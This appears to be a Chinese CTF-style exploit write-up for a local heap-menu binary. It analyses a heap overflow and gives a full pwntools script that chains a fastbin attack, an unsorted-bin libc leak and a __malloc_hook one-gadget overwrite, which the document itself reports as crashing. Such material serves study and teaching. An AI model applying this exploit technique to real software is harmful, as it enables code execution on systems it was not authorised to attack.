# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析，程序运行环境如下：
- **二进制类型**：64位ELF程序，使用动态链接的glibc。
- **保护机制**：从exp中使用的技术（如fastbin attack和libc地址泄露）推断，可能启用了NX（不可执行栈），但未明确提及ASLR、PIE或Stack Canaries。建议使用`checksec`确认，但根据漏洞利用方式，ASLR可能已开启（需泄露libc地址）。
- **依赖库**：通过`ldd`查看，依赖标准libc（如libc.so.6），具体版本由调试记录中的地址推断（如main_arena偏移）。
- **运行需求**：在Linux环境下运行，需使用pwn工具链（如pwntools）进行利用。

## 漏洞成因
### 关键结构体与反编译代码分析
- **全局数组**：
  - `chunk`数组：存储堆块指针，位于固定地址（如`0x5d91ea202260`），大小为0x50字节（10个8字节指针）。
  - `size`数组：存储用户请求的堆块大小，位于固定地址（如`0x5d91ea2020c0`），大小为0x50字节（10个4字节整数）。
- **堆管理**：程序使用malloc/free进行堆分配/释放，但未正确初始化局部变量和检查边界。
- **漏洞类型**：
  - **堆溢出**：在`edit`函数中，`read`操作使用`size[v1] + 1`作为读入大小，但通过堆布局控制或size数组覆盖，可读入超长数据（如exp中edit(6)读入0x1f字节，而分配大小仅0x10），溢出覆盖相邻chunk的元数据（如prev_size、size、fd/bk指针）。
  - **未初始化变量**：`edit`函数中的变量`v1`未初始化即用作数组索引，但exp中通过正常输入避免越界，该漏洞未直接利用。
- **根本原因**：堆溢出允许修改释放堆块的fd指针，结合UAF（通过溢出间接实现）进行fastbin attack，最终实现任意地址写。

## 漏洞利用过程
利用过程通过堆溢出修改fastbin链表，泄露libc地址，并劫持控制流。以下表格总结关键步骤的堆内存变化：

| 步骤 | 操作 | 堆内存关键变化 | 利用目的 |
|------|------|----------------|----------|
| 1 | create(6,0x10); create(7,0x20); create(8,0x20); create(9,0x40); dele(8); dele(7) | - chunk 7和8释放到fastbin（0x30 bin），形成链表：chunk7 → chunk8 → NULL<br>- chunk 6和9保持分配 | 初始化堆布局，创建fastbin链表供溢出修改 |
| 2 | edit(6, b'a'*0x1f) | - chunk 6用户数据溢出，覆盖chunk 7的prev_size和size字段<br>- fastbin链表未破坏，fd指针完好 | 验证堆溢出能力，为后续覆盖fd指针做准备 |
| 3 | show(6); 泄露chunk_addr | - 通过显示chunk 6内容泄露堆地址，计算堆基址（chunk_addr - 0x50） | 获取堆布局信息，用于计算伪造chunk地址 |
| 4 | create(0,0x10); create(1,0xf8); create(2,0x10); create(3,0xf8); create(4,0x40) | - 分配新chunk，改变堆布局<br>- chunk 1和3（大小0xf8）可能进入unsorted bin | 准备不同大小的chunk，为后续unsorted bin泄露libc地址布局 |
| 5 | edit(2, b'a'*0x10 + p64(0x120) + p64(0x100)) | - chunk 2用户数据溢出，设置伪造的size字段（0x120和0x100） | 伪造堆块元数据，为fastbin attack创造条件 |
| 6 | create(5,0x40) | - 分配chunk 5，进一步改变堆布局 | 维持堆状态，避免合并 |
| 7 | edit(0, b'a'*0x10 + p64(0) + p64(0x121) + p64(chunk1_addr) + p64(chunk1_addr)) | - chunk 0用户数据溢出，设置伪造的堆头（size=0x121）和fd/bk指针指向chunk1_addr | 构造伪造的unsorted bin chunk，用于泄露libc地址 |
| 8 | dele(3) | - chunk 3释放到unsorted bin，fd/bk指向main_arena+88（libc地址） | 通过unsorted bin泄露libc地址 |
| 9 | create(1,0xf8) | - 从unsorted bin分配chunk，可能分割或复用 | 触发unsorted bin操作，稳定堆状态 |
| 10 | show(2); 泄露main_area | - 显示chunk 2内容，获取main_arena地址（main_area） | 计算libc基址：libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook'] |
| 11 | create(10,0x68); dele(10) | - chunk 10分配后释放到fastbin（0x70 bin） | 创建fastbin链表供篡改 |
| 12 | edit(2, p64(fake_chunk)) | - 修改chunk 2的fd指针指向fake_chunk（malloc_hook - 0x23）<br>- 但fastbin链表显示异常值（0x60b6506ea0000000），可能因对齐或size不匹配 | 尝试劫持fastbin链表，实现任意地址分配 |
| 13 | create(11,0x68); create(13,0x68) | - 分配chunk 11和13时，因fastbin链表损坏，在malloc中崩溃（访问无效地址0x7d60b4000000） |  fastbin attack失败，程序段错误 |
| 14 | edit(13, b'a'*3 + p64(0) + p64(ogg) + p64(realloc_hook+16)) | - 计划写onegadget到malloc_hook，但未执行 due to crash | 意图通过hook执行shell |
| 15 | create(14,20) | - 未执行，程序已崩溃 | 触发malloc_hook执行 |
| 16 | p.interactive() | - 程序崩溃，无法获取shell | 利用失败 |

**利用总结**：利用过程成功通过堆溢出覆盖元数据和泄露libc地址，但fastbin attack因链表设置异常（地址对齐或size字段问题）失败，导致崩溃。需调整fake_chunk地址或size字段以修复。

## Exploit
以下是exp脚本，在关键位置添加注释：

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample25')
elf = ELF('./data/sample25')
libc = elf.libc  # 获取程序使用的libc

def create(ID, size):
    p.sendline(b'1')  # 选择创建菜单
    p.sendline(str(ID).encode('utf-8'))  # 发送书ID
    p.sendline(str(size).encode('utf-8'))  # 发送大小

def show(ID):
    p.sendline(b'2')  # 选择显示菜单
    p.sendline(str(ID).encode('utf-8'))  # 发送书ID以显示内容

def dele(ID):
    p.sendline(b'3')  # 选择删除菜单
    p.sendline(str(ID).encode('utf-8'))  # 发送书ID以释放堆块

def edit(ID, content):
    p.sendline(b'4')  # 选择编辑菜单
    p.sendline(str(ID).encode('utf-8'))  # 发送书ID
    p.sendline(content)  # 发送内容，可能触发堆溢出

# 步骤1: 初始化堆布局，创建fastbin链表
create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)

# 步骤2: 堆溢出验证，覆盖相邻chunk元数据
payload = b'a'*0x1f  # 溢出数据，长度超过分配大小
edit(6,payload)

# 步骤3: 泄露堆地址，计算堆基址
show(6)
p.recvuntil(b'to show?Content:')
p.recvline()
chunk_addr = p.recvline()[:-1]
chunk_addr = int.from_bytes(chunk_addr, 'little')
chunk_addr = chunk_addr - 0x50  # 调整得到堆基址

# 步骤4: 分配新chunk，为泄露libc布局
create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)

# 步骤5: 伪造堆块元数据，准备fastbin attack
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20  # 计算目标chunk地址
payload = b'a'*0x10 + p64(0x120) + p64(0x100)  # 溢出并设置伪造size
edit(2,payload)

# 步骤6: 分配chunk以维持堆状态
create(5,0x40)

# 步骤7: 构造伪造unsorted bin chunk用于泄露libc
payload = b'a'*0x10 + p64(0) + p64(0x121) + p64(chunk1_addr) + p64(chunk1_addr)
edit(0,payload)

# 步骤8: 释放chunk到unsorted bin以泄露libc地址
dele(3)

# 步骤9: 分配chunk触发unsorted bin操作
create(1,0xf8)

# 步骤10: 通过显示chunk2泄露libc地址
show(2)
p.recvuntil(b'to show?Content: ')
main_area = p.recvline()[:-1]
main_area = int.from_bytes(main_area, 'little')
# 计算libc基址和关键符号地址
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libc_addr + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23  # 计算fake_chunk地址（malloc_hook附近）

# 步骤11: 创建并释放chunk到fastbin供篡改
create(10,0x68);dele(10)

# 步骤12: 修改fastbin的fd指针指向fake_chunk
edit(2, p64(fake_chunk))  # 尝试劫持fastbin链表

# 步骤13: 分配chunk以触发任意地址分配（但fastbin损坏导致崩溃）
create(11,0x68);create(13,0x68)

# 步骤14: 计划写onegadget到malloc_hook（未执行 due to crash）
ogg = libc_addr + 0x4526a + 6  # 计算onegadget地址
realloc_hook = libc_addr + libc.sym["realloc"]
edit(13, b'a'*3 + p64(0) + p64(ogg) + p64(realloc_hook+16))  # 写payload到hook

# 步骤15: 触发malloc_hook执行（未执行）
create(14,20)

# 步骤16: 交互（程序已崩溃）
p.interactive()
```

**注释说明**：
- 关键漏洞利用点在于堆溢出（步骤2、5、7）和fastbin attack（步骤12）。
- 泄露技术通过unsorted bin（步骤8、10）实现。
- 失败原因：fake_chunk地址可能未对齐或size字段不匹配，导致fastbin链表异常。建议检查fake_chunk的地址对齐（16字节）和size字段（应为0x7f）。
